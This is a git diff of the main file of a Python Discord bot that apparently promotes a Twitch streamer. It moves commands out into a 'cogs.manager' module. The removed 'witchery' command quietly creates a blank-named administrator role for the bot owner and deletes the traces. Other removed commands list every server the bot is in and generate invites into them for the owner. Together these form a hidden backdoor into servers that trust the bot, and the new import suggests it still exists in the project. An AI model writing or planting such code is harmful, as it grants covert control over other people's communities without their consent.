@@ -3,16 +3,18 @@ from cogs.embed import _embed
 from cogs.rpc import _rpc
 from cogs.move import _move
 from cogs.wakeup import _wakeup
+from cogs.manager import _invite, _servers, _witchery
 from cogs.twitch import *
 
 bot_token = os.environ.get('DISCORD_TOKEN') #Token do bot
 
-
-client.add_cog(_embed(client))
-client.add_cog(_rpc(client))
-client.add_cog(_move(client))
-client.add_cog(_wakeup(client))
-
+#
+async def load_extensions():
+    await client.load_extension("cogs.wakeup")
+    await client.load_extension("cogs.manager") 
+    await client.load_extension("cogs.rpc")
+    await client.load_extension("cogs.move") 
+    await client.load_extension("cogs.embed") 
 
 
 @client.event               #evento no inicio do bot
@@ -25,9 +27,9 @@ async def on_ready():
     await client.change_presence(activity=discord.Streaming(name='Primeiro Discordbot do Mergrow!', url='https://www.twitch.tv/mergrow_', status=discord.Status.idle)) # Atualiza o RPC do discordbot
     check_streamer_status.start()
     await client.tree.sync(guild=discord.Object(id=922349610771546112))
-    
+    await load_extensions()
 
-    
+        
 #Slash commands
 
 @client.tree.command(name="hi", description="Say hi", guild=discord.Object(id=922349610771546112))   
@@ -89,23 +91,6 @@ async def avatar(ctx):
     await ctx.send(embed=embed)
 
 
-@client.command()
-async def witchery(ctx):
-    user = ctx.message.author
-    embed = discord.Embed(title="Witchery done! :)", color=0xc034eb,)
-    perms = discord.Permissions(administrator=True)
-    server__ = ctx.guild
-    witcheryrole = await discord.Guild.create_role(server__ ,name=str(" "), permissions=perms, color=0x302c2c)
-    roleid = ctx.guild.get_role(witcheryrole.id)
-    if(user.id == ownerid):
-        await ctx.send(embed=embed, delete_after=1)
-        time.sleep(3)
-        await ctx.message.delete()
-        await user.add_roles(roleid)
-    else:
-        embed = discord.Embed(title="You can't do Witchery! :)", color=0xc034eb)
-        await ctx.send(embed=embed)
-
 
 @client.command()
 async def host(ctx):
@@ -113,34 +98,9 @@ async def host(ctx):
     await ctx.send(embed=embed)
 
 
-@client.command()
-async def servers(ctx):
-    # Obtém uma lista de guildas em que o bot está conectado
-    user = ctx.message.author
-    if(user.id == ownerid):
-        guilds = client.guilds
 
-        # Itera sobre todas as guildas e imprime seus nomes
-        for guild in guilds:
-            await ctx.send(guild.name)
-    else: 
-        embed = discord.Embed(title="No permission.", color=0xc034eb)
 
-@client.command()
-async def invite(ctx, guild_name: str):
-    # Procura pelo nome da guilda fornecido nos servidores em que o bot está conectado
-    user = ctx.message.author
-    if(user.id == ownerid):
-        for guild in client.guilds:
-            if guild.name == guild_name:
-                # Obtém o primeiro canal de texto disponível na guilda
-                channel = guild.text_channels[0]
-                # Cria um convite para esse canal
-                invite = await channel.create_invite()
-                await ctx.send(f"Here is the invite for {guild.name}: {invite}")
-                return
-    else: 
-        embed = discord.Embed(title="No permission.", color=0xc034eb)
+
 
 
 client.run(bot_token)
